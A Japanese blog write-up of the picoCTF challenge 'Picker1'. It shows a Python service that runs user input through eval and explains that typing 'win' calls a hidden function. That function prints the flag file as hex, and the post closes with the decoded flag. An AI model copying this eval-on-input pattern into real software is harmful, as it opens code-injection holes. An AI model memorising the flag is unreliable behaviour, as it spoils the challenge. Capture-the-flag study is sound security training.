---
title: "Picker1"
pubDate: 2026-09-01
description: ""
author: "kurosiko"
image:
  url: "https://docs.astro.build/assets/rose.webp"
  alt: "ピンク色に輝く暗い背景に浮かぶAstroのロゴ。"
tags: ["picoCTF"]
---

# Picker1

> **Q.**このサービスはランダムな数字を生成する、けど他に何かできるのか?

インスタンスを立ち上げてncで接続すると

```
Try entering "getRandomNumber" without the double quotes...
==> getRandomNumber
4


Try entering "getRandomNumber" without the double quotes...
==> g
name 'g' is not defined
```

こんな感じのサービスのようだ
とりあえずinputを受け取っているのでどこかに探す

```python
while(True):
  try:
    print('Try entering "getRandomNumber" without the double quotes...')
    user_input = input('==> ')
    eval(user_input + '()')
  except Exception as e:
    print(e)
    break
```

evalでコードとして解釈しているので
受け取った関数を直で呼び出せるらしい
なら使えそうな関数ないかなと探しているとwin()を発見
```python
def win():
  # This line will not work locally unless you create your own 'flag.txt' in
  #   the same directory as this script
  flag = open('flag.txt', 'r').read()
  #flag = flag[:-1]
  flag = flag.strip()
  str_flag = ''
  for c in flag:
    str_flag += str(hex(ord(c))) + ' '
  print(str_flag)

```
flagを読み込んで、後処理してstr_flagに最終的に加工したものが渡っている
`str(hex(ord(c)))`は文字をUnicode(10進数)にしてHexにしてそれを文字列として認識させている

つまりは最終的にflag.txtのUnicodeでdecodeされたHex表記のものが出力されるはずである
ここまでくればあとは手動で戻してあげるだけだね
```

Try entering "getRandomNumber" without the double quotes...
==> win
0x70 0x69 0x63 0x6f 0x43 0x54 0x46 0x7b 0x34 0x5f 0x64 0x31 0x34 0x6d 0x30 0x6e 0x64 0x5f 0x31 0x6e 0x5f 0x37 0x68 0x33 0x5f 0x72 0x30 0x75 0x67 0x68 0x5f 0x63 0x65 0x34 0x62 0x35 0x64 0x35 0x62 0x7d
```


picoCTF{4_d14m0nd_1n_7h3_r0ugh_ce4b5d5b}
